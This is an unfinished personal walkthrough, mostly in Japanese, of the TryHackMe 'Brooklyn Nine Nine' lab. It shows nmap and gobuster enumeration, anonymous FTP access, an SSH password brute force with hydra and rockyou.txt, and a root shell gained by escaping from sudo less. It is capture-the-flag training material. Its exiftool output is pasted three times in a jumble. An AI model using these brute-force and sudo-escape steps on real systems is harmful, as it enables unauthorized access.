# TryHackMe - Brooklyn Nine Nine
[https://tryhackme.com/room/brooklynninenine](https://tryhackme.com/room/brooklynninenine)

## Target Info
- IP: 10.10.251.27
- OS: 

## 1. Enumeration

### nmap

```
> sudo nmap -sV -O 10.10.251.27

Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
```

#### 80
- 画像が貼ってあるページ。画面を縮小しても最大サイズになることを確認してください的な文言
- Have you ever heard of steganography?の文言
- 画像の中にアクセス情報入ってたりするのか？
- 画像のパス発見したので中身見てみる
- 画像を調べる

```
file brooklyn99.jpg 
brooklyn99.jpg: JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, baseline, precision 8, 533x300, components 3
```

```
ExifTool Version Number         : 13.30
File Name                       : brooklyn99.jpg
Directory                       : .
File Size                       : 70 kB
File Modification Date/Time     : 2025:06:03 23:37:41+09:00
File Access Date/Time           : 2025:06:03 23:37:46+09:00
File Inode Change Date/Time     : 2025:06:03 23:37:44+09:00
File Permissions                : -rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : None
X Resolution                    : 1
Y Resolution                    : 1
Image Width                     : 533
Image Height                    : 300
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 533x300
Megapixels                      : 0.160
ryotanoMacBook-ea:Desktop ryota$ exiftool brooklyn99.jpg
ExifTool Version Number         : 13.30
File Name                       : brooklyn99.jpg
Directory                       : .
File Size                       : 70 kB
File Modification Date/Time     : 2025:06:03 23:37:41+09:00
File Access Date/Time           : 2025:06:03 23:37:46+09:00
File Inode Change Date/Time     : 2025:06:03 23:37:44+09:00
File Permissions                : -rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : None
X Resolution                    : 1
Y Resolution                    : 1
Image Width                     : 533
Image Height                    : 300
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 533x300
Megapixels                      : 0.
ExifTool Version Number         : 13.30
File Name                       : brooklyn99.jpg
Directory                       : .
File Size                       : 70 kB
File Modification Date/Time     : 2025:06:03 23:37:41+09:00
File Access Date/Time           : 2025:06:03 23:37:46+09:00
File Inode Change Date/Time     : 2025:06:03 23:37:44+09:00
File Permissions                : -rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : None
X Resolution                    : 1
Y Resolution                    : 1
Image Width                     : 533
Image Height                    : 300
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 533x300
Megapixels                      : 0.160
```

- 特に怪しいところはなし


### gobuster

- gobuster dir -u http://10.10.251.27 -w common.txt http

```
> gobuster dir -u http://10.10.251.27 -w common.txt http

Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 277]
/.htaccess            (Status: 403) [Size: 277]
/.htpasswd            (Status: 403) [Size: 277]
/index.html           (Status: 200) [Size: 718]
/server-status        (Status: 403) [Size: 277]
```

- /index.html はトップと同じ

## FTP 
- lftp -u anonymous 10.10.104.75
- パスワードなしのユーザで進入

```
lftp -u anonymous 10.10.104.75
パスワード: 
lftp anonymous@10.10.104.75:~> ls                                       
-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
```

- get note_to_jake.txt で中身を確認

```
From Amy,

Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine
```

- jakeというユーザのパスワードが弱いらしい。おそらくsshの話
 
## hydra

```
hydra -l jake -P rockyou.txt -f -o found.txt ssh://10.10.104.75

[DATA] attacking ssh://10.10.104.75:22/
[22][ssh] host: 10.10.104.75   login: jake   password: 987654321
[STATUS] attack finished for 10.10.104.75 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-06-04 22:20:27
```

- jakeはpassword 987654321

## ssh

- ssh jake@10.10.104.75 でログイン成功
- でログイン成功

## ログイン後の話
- id
  - uid=1000(jake) gid=1000(jake) groups=1000(jake)
- pwd
  - /home/jake
- whois
  - コマンドなし
- sudo -l
  - /usr/bin/lessがパスワードなしでsudo実行できる

```
Matching Defaults entries for jake on brookly_nine_nine:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jake may run the following commands on brookly_nine_nine:
    (ALL) NOPASSWD: /usr/bin/less
```

- find / -user root -perm -u=s -type f 2>/dev/null

## 一般ユーザフラグ
- /home/holtにuser.txt発見

## ルートユーザー
- sudo less user.txtでファイルを開き
- !/bin/bashでbashをルートユーザで起動
- /home/rootにroot.txt発見

## 2. Exploitation


## 3. Privilege Escalation

## 4. Flags
